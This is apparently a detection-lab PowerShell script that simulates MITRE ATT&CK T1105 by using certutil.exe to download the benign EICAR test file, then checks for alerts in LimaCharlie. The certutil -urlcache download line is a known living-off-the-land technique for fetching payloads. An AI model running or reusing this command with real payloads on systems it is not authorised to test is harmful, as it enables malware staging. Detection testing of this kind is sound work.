# Scenario 1 Attack Simulation: Certutil LOLBAS Download
Write-Host "[*] Executing MITRE ATT&CK T1105 (Ingress Tool Transfer via certutil)..." -ForegroundColor Yellow

$outputDir = "C:\LabAttacks"
if (!(Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir -Force | Out-Null }

$command = "certutil.exe -urlcache -split -f https://secure.eicar.org/eicar.com $outputDir\payload_certutil.tmp"
Write-Host "[*] Running: $command" -ForegroundColor Gray
cmd.exe /c $command

Write-Host "[✓] Execution completed. Check LimaCharlie Detections dashboard." -ForegroundColor Green
